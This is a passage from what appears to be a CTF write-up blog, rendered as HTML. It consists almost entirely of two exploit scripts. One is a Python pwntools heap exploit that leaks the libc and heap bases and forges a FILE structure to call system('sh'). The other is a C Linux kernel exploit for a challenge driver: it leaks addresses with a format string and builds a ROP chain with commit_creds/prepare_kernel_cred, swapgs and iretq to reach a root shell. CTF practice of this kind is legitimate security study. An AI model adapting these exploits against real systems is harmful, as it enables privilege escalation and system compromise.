class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">throwit</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#====================================================================</span></span><br><span class="line"></span><br><span class="line">libc_leak_off = <span class="number">0x1b2761</span></span><br><span class="line">heap_leak_off = <span class="number">0x120</span></span><br><span class="line">free_hook_off = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook_off = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">stdin_io_off = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">io_list_all_off = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">one_shoot_off = [<span class="number">0x3ac5c</span>, <span class="number">0x3ac5e</span>, <span class="number">0x3ac62</span>, <span class="number">0x3ac69</span>, <span class="number">0x5fbc5</span>, <span class="number">0x5fbc6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#====================================================================</span></span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">comment(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8c</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">0</span>)</span><br><span class="line">throwit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">throwit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Comment &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">4</span>)) - libc_leak_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line">free_hook = libc_base + free_hook_off</span><br><span class="line">malloc_hook = libc_base + malloc_hook_off</span><br><span class="line">stdin_io = libc_base + stdin_io_off</span><br><span class="line">heap_base = u32(io.recv(<span class="number">4</span>)) - heap_leak_off</span><br><span class="line">io_list_all = libc_base + io_list_all_off</span><br><span class="line">one_shoot = libc_base + one_shoot_off[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>, <span class="number">0</span>)</span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">comment(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8c</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">purchase(<span class="number">0x14</span>, <span class="string">&#x27;4&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">2</span>)</span><br><span class="line">throwit(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x34</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">purchase(<span class="number">0x104</span>, payload) <span class="comment">#3</span></span><br><span class="line">purchase(<span class="number">0xf4</span>, <span class="string">&#x27;cccc&#x27;</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;!&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>)</span><br><span class="line">purchase(<span class="number">0x34</span>, payload) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">2</span>)</span><br><span class="line">throwit(<span class="number">3</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x34</span></span><br><span class="line">purchase(<span class="number">0x34</span>, payload) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">purchase(<span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x39</span>)</span><br><span class="line">purchase(<span class="number">0x34</span>, payload) <span class="comment">#7</span></span><br><span class="line">purchase(<span class="number">0x3c</span>, <span class="string">&#x27;.&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">7</span>) <span class="comment">#get victim </span></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">3</span>)</span><br><span class="line">throwit(<span class="number">5</span>) <span class="comment">#merge</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x19</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x39</span>)</span><br><span class="line">payload += p32(heap_base + <span class="number">0x308</span>)</span><br><span class="line">purchase(<span class="number">0x90</span>, payload) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">throwit(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_jump = heap_base + <span class="number">0x318</span></span><br><span class="line"></span><br><span class="line">fake_stdout = <span class="string">&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x31</span>) + p32(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line">fake_stdout += p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0xc0</span>)*<span class="number">2</span></span><br><span class="line">fake_stdout += p32(<span class="number">0</span>) + p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stdout += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0</span>)</span><br><span class="line">fake_stdout += p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p32(libc_base+<span class="number">0x1b3870</span>) + p32(<span class="number">0xffffffff</span>)</span><br><span class="line">fake_stdout += p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p32(libc_base + <span class="number">0x1b24e0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">fake_stdout += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">fake_stdout += p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_stdout += p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_stdout += p32(<span class="number">0</span>) + p32(fake_jump)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x39</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x00\x00\x00&#x27;</span></span><br><span class="line">purchase(<span class="number">0x34</span>, payload) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x169</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x1b27b0</span>) + p32(io_list_all - <span class="number">0x8</span>)</span><br><span class="line">purchase(<span class="number">0x34</span>, payload) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system)*<span class="number">4</span>*<span class="number">2</span> + p32(system)*<span class="number">2</span></span><br><span class="line">payload += fake_stdout</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(<span class="number">352</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Name: &#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Price: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;libc base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;heap base: &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">sh()</span><br></pre></td></tr></table></figure>

<h3><span id="sudrv">sudrv</span><a href="#sudrv" class="header-anchor"></a></h3><p>溢出 改栈 rop</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="comment">//0xFFFFFFFF819ED1C0 copy_user_generic_unrolled proc near</span></span><br><span class="line"><span class="comment">//0xffffffff810c8d2f: mov rdi, rcx; sub rdi, rdx; mov rax, rdi; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff81174b83: mov rcx, rax; pop r12; pop r13; mov rax, rcx; ret; </span></span><br><span class="line"><span class="comment">//0xFFFFFFFF81081790: prepare_kernel_cred</span></span><br><span class="line"><span class="comment">//0xFFFFFFFF81081410: commit_creds</span></span><br><span class="line"><span class="comment">//0xffffffff81001388: pop rdi; ret;</span></span><br><span class="line"><span class="comment">//0xffffffff81043ec8: pushfq; ret;</span></span><br><span class="line"><span class="comment">//0xffffffff81044f17: pop rdx; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff8104e5b1: mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"><span class="comment">//0xffffffff81a00d5a: swapgs; popfq; ret;  </span></span><br><span class="line"><span class="comment">//0xffffffff81021762: iretq; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff81044f17: pop rdx; ret; </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) KERNCALL ;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) KERNCALL ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">su</span><span class="params">()</span>&#123;</span><br><span class="line">      commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;shell:&quot;</span>);</span><br><span class="line">    	execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">su_print</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0xDEADBEEF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">su_malloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x73311337</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">su_free</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x13377331</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_eflags,user_sp	;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell_again</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SIGSEGV found&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;get shell again&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *shell = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  <span class="type">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">	signal(SIGSEGV,get_shell_again);</span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/meizijiutql&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="type">char</span> format[<span class="number">150</span>]=</span><br><span class="line"><span class="string">&quot;0x%llx0x%llx0x%llx0x%llx0x%llx0x%lx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx\n&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf1[<span class="number">100</span>]=<span class="string">&quot;aaaaaaaa&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf2[<span class="number">100</span>]=<span class="string">&quot;bbbbbbbb&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf4[<span class="number">100</span>]=<span class="string">&quot;cccccccc&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> module_base ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdi;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movcr4;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> vmbase ; </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrcxrax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrdircx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">0x30</span>];</span><br><span class="line">	</span><br><span class="line">	su_malloc(fd1,CRED_SIZE);</span><br><span class="line">	write(fd1,format,<span class="number">150</span>);</span><br><span class="line">	su_print(fd1);	</span><br><span class="line">	<span class="comment">//su_print(fd1);</span></span><br><span class="line">	su_free(fd1);</span><br><span class="line">	<span class="type">char</span> addr[<span class="number">16</span>];</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">&quot;input stack addr above(ffffxxxxxxxxed8-0x88)       \n&quot;</span>,<span class="number">60</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,(<span class="type">long</span> <span class="type">long</span> *)addr);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">&quot;input vmlinux addr above(ffffffff8889a268)        \n&quot;</span>,<span class="number">60</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;vmbase);</span><br><span class="line">	vmbase = (vmbase <span class="number">-19505768</span>) - <span class="number">0xFFFFFFFF81000000</span>;<span class="comment">// (0xffffffffa4c9a268-0xffffffffa3a00000));</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%llx&quot;</span>,vmbase);</span><br><span class="line">	prepare_kernel_cred = vmbase + <span class="number">0xFFFFFFFF81081790</span>;</span><br><span class="line">	commit_creds = vmbase + <span class="number">0xFFFFFFFF81081410</span>;</span><br><span class="line">	swapgs = vmbase + <span class="number">0xffffffff81a00d5a</span>;</span><br><span class="line">	iretq = vmbase + <span class="number">0xffffffff81021762</span>;</span><br><span class="line">	poprdi = vmbase + <span class="number">0xffffffff81001388</span>;</span><br><span class="line">	poprdx = vmbase + <span class="number">0xffffffff81044f17</span>;</span><br><span class="line">	movcr4 = vmbase +<span class="number">0xffffffff8104e5b1</span>;</span><br><span class="line">	movrcxrax = vmbase + <span class="number">0xffffffff81174b83</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pushrax= vmbase +<span class="number">0xffffffff812599a8</span>;	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprbx = vmbase +<span class="number">0xffffffff81000926</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> callrbx = vmbase+<span class="number">0xffffffff81a001ea</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprbp = vmbase + <span class="number">0xffffffff810004ee</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred:0x%llx \n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;commit_creds:0x%llx  \n&quot;</span>,commit_creds);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;swapgs:0x%llx \n&quot;</span>,swapgs);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;iretq:0x%llx \n&quot;</span>,iretq);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;call rbx:0x%llx \n&quot;</span>,callrbx);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ready&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(getchar()!=<span class="string">&#x27;y&#x27;</span>) ;</span><br><span class="line">	save_stats();</span><br><span class="line"><span class="comment">//0xffffffff810004ee: pop rbp; ret;</span></span><br><span class="line"><span class="comment">//0xffffffff810c8d2f: mov rdi, rcx; sub rdi, rdx; mov rax, rdi; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff81174b83: mov rcx, rax; pop r12; pop r13; mov rax, rcx; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff829654a7: mov rdi, rbx; call rax; </span></span><br><span class="line"><span class="comment">//0xffffffff8107f537: push rax; pop rbx; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff8101ac0c: pop rax; ret;</span></span><br><span class="line"><span class="comment">//0xffffffff8296b882: mov rdi, rsi; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff81a001ea: mov rdi, r12; call rbx; </span></span><br><span class="line"><span class="comment">//0xffffffff812599a8: push rax; pop r12; pop r13; pop r14; pop r15; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff81000926: pop rbx; ret; </span></span><br><span class="line">	rop[<span class="number">0</span>]=poprdi;</span><br><span class="line">	rop[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">	rop[<span class="number">2</span>]=prepare_kernel_cred;</span><br><span class="line">	rop[<span class="number">3</span>]=pushrax;</span><br><span class="line">	rop[<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">	rop[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line">	rop[<span class="number">6</span>]=<span class="number">0</span>;</span><br><span class="line">	rop[<span class="number">7</span>]=poprbx;</span><br><span class="line">	rop[<span class="number">8</span>]=poprdx;</span><br><span class="line">	rop[<span class="number">9</span>]=callrbx;</span><br><span class="line">	rop[<span class="number">10</span>]=commit_creds;</span><br><span class="line">	rop[<span class="number">11</span>]=swapgs;</span><br><span class="line">	rop[<span class="number">12</span>]=<span class="number">0x246</span>;</span><br><span class="line">	rop[<span class="number">13</span>]=poprbp;</span><br><span class="line">	rop[<span class="number">14</span>]=(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rop+<span class="number">0x100</span>;</span><br><span class="line">	rop[<span class="number">15</span>]=iretq;</span><br><span class="line">	rop[<span class="number">16</span>]= (<span class="type">size_t</span>)&amp;get_shell;</span><br><span class="line">	rop[<span class="number">17</span>] = user_cs;</span><br><span class="line">	rop[<span class="number">18</span>] = user_eflags;</span><br><span class="line">	rop[<span class="number">19</span>] = user_sp;</span><br><span class="line">	rop[<span class="number">20</span>] = user_ss;</span><br><span class="line">	rop[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> mem[<span class="number">0xc0</span>+<span class="number">0x10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="number">0x41</span>,<span class="number">0xd0</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(mem+<span class="number">0xc0</span>,addr,<span class="number">0x10</span>);</span><br><span class="line">	write(<span class="number">1</span>,mem,<span class="number">0xd0</span>);</span><br><span class="line">	su_malloc(fd1,CRED_SIZE);</span><br><span class="line">	write(fd1,mem,<span class="number">0xd0</span>);</span><br><span class="line">	su_malloc(fd1,CRED_SIZE);</span><br><span class="line">	write(fd1,buf2,<span class="number">100</span>);</span><br><span class="line">	su_malloc(fd1,CRED_SIZE);</span><br><span class="line">	write(fd1,(<span class="type">char</span>*)rop,<span class="number">180</span>);</span><br><span class="line">	su_malloc(fd1,CRED_SIZE);</span><br><span class="line">	write(fd1,(<span class="type">char</span>*)rop,<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*	</span></span><br><span class="line"><span class="comment">	close(fd1);</span></span><br><span class="line"><span class="comment">	int pid = fork();</span></span><br><span class="line"><span class="comment">	if(pid ==0)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		//set(fd2,buf4,100);</span></span><br><span class="line"><span class="comment">		sleep(2);</span></span><br><span class="line"><span class="comment">		system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">		//su_malloc(fd1,CRED_SIZE);</span></span><br><span class="line"><span class="comment">		//set(fd1,buf2,CRED_SIZE);</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	else</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		char buf3[2*CRED_SIZE];</span></span><br><span class="line"><span class="comment">		